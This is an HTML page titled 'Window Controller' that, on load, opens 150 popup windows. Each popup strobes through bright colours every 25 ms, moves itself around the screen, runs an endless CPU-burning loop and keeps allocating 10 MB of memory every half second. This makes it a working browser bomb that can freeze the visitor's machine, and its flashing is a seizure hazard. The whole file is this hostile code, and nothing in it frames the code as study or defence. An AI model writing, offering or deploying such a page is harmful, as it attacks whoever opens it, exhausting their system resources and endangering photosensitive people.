<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Window Controller</title>
  <style>
    body {
      background: #111;
      color: white;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      font-family: sans-serif;
    }
  </style>
</head>
<body onload="winow()">

  <script>
    function winow() {
      const now = 150;
      const br = 5;
      const rs = 4;
      const speed = 1;

      for (let i = 0; i < now; i++) {
        const popup = window.open('', '', 'width=50,height=50');

        if (!popup) {
          console.error("Popup blocked! Please allow popups for this site.");
          return;
        }

        const radius = br + i * rs;
        const initialAngle = i * (Math.PI / 5);

        popup.document.write(`
          <!DOCTYPE html>
          <html>
          <head>
            <title>Popup</title>
            <style>
              html, body { height: 100%; margin: 0; overflow: hidden; }
            </style>
          </head>
          <body>
            <script>
              const colors = ["#FF0000", "#00FF00", "#0000FF", "#FFFF00", "#FF00FF", "#00FFFF", "#FFFFFF", "#000000"];
              let ramData = [];
              let colorIdx = 0;

              setInterval(() => {
                document.body.style.backgroundColor = colors[colorIdx];
                colorIdx = (colorIdx + 1) % colors.length;
              }, 25);

              let angle = ${initialAngle};
              const radius = ${radius};
              const speed = ${speed};

              const centerX = screen.availWidth / 2 - 150;
              const centerY = screen.availHeight / 2 - 100;

              function animate() {
                angle += speed; // Adjusted speed for visible movement
                const x = centerX + radius * Math.cos(angle);
                const y = centerY + radius * Math.sin(angle);
                window.moveTo(x, y);
                requestAnimationFrame(animate);
              }

              function cpuLoop() {
                for (let i = 0; i < 1e6; i++) {
                  Math.sqrt(Math.random());
                }
                setTimeout(cpuLoop, 10);
              }

              function ramLoop() {
                try {
                  let data = new Uint8Array(10 * 1024 * 1024); // 10MB increments
                  data.fill(255);
                  ramData.push(data);
                } catch (e) {
                  console.error("Memory limit reached");
                }
                setTimeout(ramLoop, 500);
              }

              animate();
              cpuLoop();
              ramLoop();
            <\/script>
          </body>
          </html>
        `);
        popup.document.close();
      }
    }
  </script>
</body>
</html>
